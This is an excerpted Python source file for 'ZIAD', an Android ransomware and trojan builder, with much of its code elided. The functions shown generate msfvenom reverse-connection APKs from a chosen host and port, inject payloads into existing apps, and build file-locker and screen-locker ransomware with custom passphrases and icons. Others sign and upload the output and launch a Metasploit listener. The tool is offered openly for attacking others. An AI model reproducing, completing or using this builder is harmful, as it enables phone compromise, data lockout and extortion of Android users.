...
try:
    ...
    exit(f'''
{ziad} : It seems there is a module that you have not installed
...
def banner():
    ...
    print(w+b+" ⢀⣠⣶⣾⣿⣿⣿⣿⣿⣶⣤⣀⣀⣀⣠⣴⣾⣿⣿⣿⣿⣷⣶⣤    ")
    print(w+b+" ⣴⣿⣿⠿⠟⢻⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⡿⣿⣟⠻⠿⢿⣿⣦ ")
    print(w+b+" ⣾⡿⠋⠀⠀⢸⣿⡇⠈⠛⣿⣿⣗⡀⢈⣿⣿⠟⠉⠀⣿⣿⠀⠀⠀⠈⠻⣷⡀  "+w+"'"+r+"Beware of Ransomware"+b+w+"'")
    print(w+b+"⣸⠏    ⠸⣿⣧⠀⠀⠈⣿⣿⣿⣿⣿⠃⠀⠀⣼⣿⡯⠀    ⠘⣇ "+d+"by ✔ niko.nikoツ"+w)
    print(w+b+"⣹      ⠹⣿⣷⡀⠀⢸⣿⣿⣿⡇⠀⢀⣴⣿⡟        ⢿ ")
    print(w+b+"⠙       ⠘⠿⣿⣷⢼⣿⣿⣿⣇⣾⣿⡿⠛          ⠛")
    print(w+b+"           ⠈⢹⣿⣿⣿⣿⣿⣏⠉⠀             ")
    print(w+b+"  ⢄⡀⠀⠀⠀⠀⠀⣠⣴⣿⣿⡿⠛⢿⣿⣿⣷⣄⠀⠀⠀⠀⠀⢀⡠⠄ "+w)
...
def replace_string(oldstr, newstr, file):
    text = f'{ziad} : add \'{d}{truncates(newstr)}{w}\' on \'{d}{os.path.basename(file)}{w}\' ... '
...
def add_new_icon(icon, path):
    text = f'{ziad} : add \'{d}ic_launcher.png{w}\' into \'{d}mipmap-hdpi-v4{w}\' ... '
    ...
    print(text + f'{g}done{w}')
    text = f'{ziad} : add \'{d}ic_launcher.png{w}\' into \'{d}AndroidManifest.xml{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
...
def rename_version_code(cstr, path):
    text = f'{ziad} : add \'{d}{cstr}{w}\' into \'{d}{path}/apktool.yml{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
...
def rename_version_name(nstr, path):
    text = f'{ziad} : add \'{d}{nstr}{w}\' into \'{d}{path}/apktool.yml{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
...
def rename_dir(olddir, newdir):
    text = f'{zaid} : rename \'{d}{olddir.split("/")[-1]}{w}\' into \'{d}{newdir.split("/")[-1]}{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
...
def upload_file(file):
    prints(f'''
{ziad} : do you want to upload \'{g}{file}{w}\' ?
    ...
    text = f'{ziad} : upload \'{d}{file}{w}\' into the link ...'
    print(text + f'{y}wait{w}', end='\r')
    ...
    print(text + f'{g}done{w}')
    prints(f'''
{ziad} : your file has been successfully uploaded,
...
def generate_trojan(host, port, name = None):
    ...
    text = f'{ziad} : generate \'{d}{name}.apk{w}\' using msfvenom{w} ... '
    print(text + f'{y}wait{w}', end='\r')
...
def generate_infected_trojan(host, port, orig):
    ...
    text = f'{ziad} : infection \'{g}{name}.apk{w}\' using msfvenom{w} ... '
    ...
    if not os.path.isfile(file): exit(text + f'{r}fail{w}')
    text = f'{ziad} : infection \'{g}{name}-infected.apk{w}\' using msfvenom{w} ... '
    print('\n' + w + text + f'{g}done{w}')
    return file
...
def genertare_file_locker(name, desc, icon):
    ...
    text = f'{ziad} : add \'{d}{os.path.basename(icon)}{w}\' into \'{d}ic_launcher{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
...
def genertare_screen_locker(name, head, desc, keys, icon):
    ...
    print(f'{ziad} : add \'{d}{keys}{w}\' as passprhase ... {y}wait{w}', end='\r')
    replace_strings('app_keys', keys, f'{path}/smali/com/termuxhackers/id/MyService$100000000.smali')
    print(f'{ziad} : add \'{d}{keys}{w}\' as \'{d}passprhase{w}\' ... {g}done{w}')
    text = f'{ziad} : add \'{d}{os.path.basename(icon)}{w}\' into \'{d}ic_launcher{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
    for line in os.popen(f'find -O3 -L {path} -name \'ic_launcher.png\'', 'r').read().splitlines():
        if os.path.isfile(line):
...
def start_trojan_listener(host, port):
    prints(f'''
{ziad} : redirecting to the metasploit console
...
def uber_apk_signer(file):
    text = f'{ziad} : signing \'{d}{file}{w}\' using uber-apk-signer ... '
    print(text + f'{y}wait{w}', end='\r')
...
def decompile(file):
    text = f'{ziad} : decompile \'{d}{file}{w}\' using apktool ... '
...
def recompile(path):
    text = f'{ziad} : recompile \'{d}{path}{w}\' using apktool ... '
    file = path + '.apk'
    print(text + f'{y}wait{w}', end='\r')
...
class __ziad__:
    ...
    def custom_trojan(self):
        banner()
        prints(f'''
{ziad} : you can fill or leave blank for using
        ...
        prints(f'''
{ziad} : well this process takes a few minutes,
        ...
        upload_file(apps)
        if not os.path.isfile(apps): exit(f'\n{ziad} : sorry, failed to build \'{d}{apps}{w}\' :( \n')
        prints(f'''
{ziad} : your trojan apps successfully created
        ...
        else: exit(f'\n{ziad} : process completed successfully ...\n')
        start_trojan_listener(host, port)

    def infect_trojan(self):
        banner()
        prints(f'''
{ziad} : you can fill or leave blank for using default config
        ...
        if not os.path.isfile(orig): exit(f'{ziad} : file \'{d}{orig}{w}\' doesn\'t exist !')
        host = str(input(f'         set app host: '))
        if not host: host = self.ipv4
        port = str(input(f'         set app port: '))
        if not port: port = '4444'
...
{ziad} : well this process takes a few minutes,
        ...
        upload_file(file)
        if not os.path.isfile(file): exit(f'\n{ziad} : sorry, failed to build \'{d}{file}{w}\' :( \n')
        prints(f'''
{ziad} : your trojan apps successfully created
...
{ziad} : well this process takes a few minutes,
        ...
        if not os.path.isfile(file): exit(f'\n{ziad} : sorry, failed to build \'{d}{file}{w}\' :( \n')
        prints(f'''
{ziad} : your file locker apps successfully created
...
{ziad} : you can fill or leave blank for using default config
         ...
         desc = \'{r}locked by ziad@biohazard-id{w}\'
        ...
        desc = str(input(f'         set app desc: '))
        if not desc: desc = 'locked by ziad@biohazard-id'
        icon = str(input(f'         set app icon: '))
        if not os.path.isfile(icon): icon = 'data/tmp/icon.png'
...
{ziad} : well this process takes a few minutes,
        ...
        if not os.path.isfile(file): exit(f'\n{ziad} : sorry, failed to build \'{d}{file}{w}\' :( \n')
        prints(f'''
{ziad} : your screen locker apps successfully created
         the application is saved as \'{g}{file}{w}\'
    ...
    def menu(self):
        banner()
        prints(f'''
{ziad} : Hi user, welcome to @{y}ZIAD{w} :)

{ziad} : ziad is a simple android ransomware attack
...
{ziad} : ok, you can choose one ...
         ...
         (3) back to previous
                ...
                while True:
                    ...
                    else: print(f'{ziad} : sorry, no command found for: {main_menu}'); continue
                    break
            elif main in ('2', '02'): self.custom_file_locker()
            elif main in ('3', '03'): self.custom_screen_locker()
            elif main in ('4', '04', 'exit'): exit(1)
            else: print(f'{ziad} : sorry, no command found for: {main}'); continue
            break
        input(f'{ziad} : press enter for back to \'{g}main menu{w}\' (enter) ')
        self.menu()
